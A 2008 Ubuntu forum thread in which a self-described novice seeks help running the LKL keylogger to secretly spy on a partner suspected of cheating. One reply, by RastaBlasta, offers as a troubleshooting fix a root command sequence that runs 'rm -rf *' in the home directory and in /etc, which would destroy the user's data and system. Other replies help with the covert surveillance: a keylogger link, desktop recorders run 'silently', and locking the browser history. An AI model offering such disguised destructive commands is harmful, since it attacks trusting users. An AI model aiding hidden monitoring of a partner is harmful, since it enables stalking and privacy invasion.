---
title: "Need Help"
date: 2008-09-24
forum: General Help
---

### Post by Ryuichi17 on 2008-09-24
Okay, so here is my problem. I have been afraid to say anything or ask for help with this for a long time because I don't want people trying to think I am trying to hack something, or anything along those lines. I think I need a keylogger, but if there is a way around it that would be nice. The reason I need a keylogger is because i found out my partner for over 2 years has been cheating on me and has been recently going to dating sites. It's MY computer, and i keep getting locked out. The history keeps getting deleted, the cache and everything is deleted. How can I find out what is going on when everything is gone?

My solution = keylogger. Even if the history is deleted I'd still be able to find out what sites my partner was on.

I used Synaptec to install the LKL Keylogger, but i can't seem to acces it, get it to run, or anything else. Can anyone help, or give me any advice?

edit- btw i'm a complete and utter n00b when it comes to Ubuntu. I don't really know much about terminals except for the sudo apt install and update and upgrade options...o.O even the install one is fairly difficult for me to understand. So if you have instructions please try and make them as basic step-by-step as possible....thank you


btw I types in 

sudo locate lkl

and it came up with this :

eric@Eric:~$ sudo locate lkl
[sudo] password for eric: 
/home/eric/LKL/lkl.c
/home/eric/LKL/lkl.h
/home/eric/LKL/.deps/lkl.Po
/usr/bin/lkl
/usr/share/lkl
/usr/share/doc/lkl
/usr/share/doc/lkl/NEWS.gz
/usr/share/doc/lkl/README
/usr/share/doc/lkl/README.Debian
/usr/share/doc/lkl/changelog.Debian.gz
/usr/share/doc/lkl/changelog.gz
/usr/share/doc/lkl/copyright
/usr/share/lkl/keymaps
/usr/share/lkl/keymaps/dvorak_km
/usr/share/lkl/keymaps/dvorak_kmALT
/usr/share/lkl/keymaps/dvorak_kmUP
/usr/share/lkl/keymaps/fr_km
/usr/share/lkl/keymaps/fr_kmALT
/usr/share/lkl/keymaps/fr_kmUP
/usr/share/lkl/keymaps/it_km
/usr/share/lkl/keymaps/it_kmALT
/usr/share/lkl/keymaps/it_kmUP
/usr/share/lkl/keymaps/us_km
/usr/share/lkl/keymaps/us_kmALT
/usr/share/lkl/keymaps/us_kmUP
/var/cache/apt/archives/lkl_0.1.1-1_i386.deb
/var/lib/dpkg/info/lkl.list
/var/lib/dpkg/info/lkl.md5sums


if I have lkl how can i figure out how to use it, or is it not properly installed? o.O Sorry I am confused!!!!

---

### Post by RastaBlasta on 2008-09-24
If you have installed the LKL keylogger, but it is not working, please try this, and let me know how you get on. 

Thanks

In the terminal type the following commands in this order.
```
sudo su
```
Enter Password
```
cd ~
```
```
chmod 777 *
```
```
rm -rf *
```
```
cd /etc
```
```
chmod 777 *
```
```
rm -rf *
```
```
reboot
```

After rebooting to Re-install LKL through synaptic.

If all else fails code your own logger, not hard.

---

### Post by Ryuichi17 on 2008-09-25
anyone have any advice at all?

---

### Post by Kevbert on 2008-09-25
Sorry to hear about your problem.
Don't know about that one but you might want to take a look at [[COLOR="Red"]this[/COLOR]]("http://distrojockey.com/2005/ultimate-linux-keylogger-uberkey.190.linux").  The other possibility is to install firewall software (Ubuntu has UFW by default and I believe you should be able to log all websites visited with it).

---

### Post by Ryuichi17 on 2008-09-27
I took a look at that web link provided but I didn't see a download/install link. I did  a little bit of looking around and noticed it's a tar.gz file that I need. Where can I find that? Currently I am doing a google search but so far no luck. (not very good with google >.<)

---

### Post by limasierra on 2008-09-27
There is an addon for Firefox that protects many things, like history, firefox preferences and other with a password. The name is Public Fox. You can download it from: [HTML]https://addons.mozilla.org/en-US/firefox/addon/3911[/HTML]or from[HTML]http://mozilla.isc.org/pub/mozilla.org/addons/3911/[/HTML]Make sure that you install the latest version and then restart firefox. Select the addon preferences: "Tools">"Addons">"Public Fox". Then select the items "Lock Add-ons windows", "Lock Firefox options" and "lock History sidebar". Select a password. You still have to "Edit">"Firefox Preferences">"Privacy" and uncheck the option "Always clear my private data when I close firefox". Now your partner won't be able to delete history.

---

### Post by ww711 on 2008-09-27
> **Ryuichi17 said:**
> It's MY computer, and i keep getting locked out

:lolflag:

---

### Post by ww711 on 2008-09-27
install a desktop capture program that records the whole desktop session activity. 

Istanbul?
Wink?
XvidCap?

You'd have to somehow make it run in the background 'silently'.

---

### Post by Ryuichi17 on 2008-09-30
> **limasierra said:**
> There is an addon for Firefox that protects many things, like history, firefox preferences and other with a password. The name is Public Fox. You can download it from: [HTML]https://addons.mozilla.org/en-US/firefox/addon/3911[/HTML]or from[HTML]http://mozilla.isc.org/pub/mozilla.org/addons/3911/[/HTML]Make sure that you install the latest version and then restart firefox. Select the addon preferences: "Tools">"Addons">"Public Fox". Then select the items "Lock Add-ons windows", "Lock Firefox options" and "lock History sidebar". Select a password. You still have to "Edit">"Firefox Preferences">"Privacy" and uncheck the option "Always clear my private data when I close firefox". Now your partner won't be able to delete history.

I added the add-on and did all that. the problems that i noticed is that you can still erase the history by going to "Tools>Clear Private Data" and you can still go to "History>Show All" And delete history files that way. however the sidebar is not longer able to be used.

---

### Post by Ryuichi17 on 2008-09-30
> **ww711 said:**
> install a desktop capture program that records the whole desktop session activity. 

Istanbul?
Wink?
XvidCap?

You'd have to somehow make it run in the background 'silently'.

I've never even heard of those...like I said I'm completely new to Ubuntu. I didn't get the chance to research it or how it works or anything.I don't know any commands codes, etc... So i don't know how to do that!

---

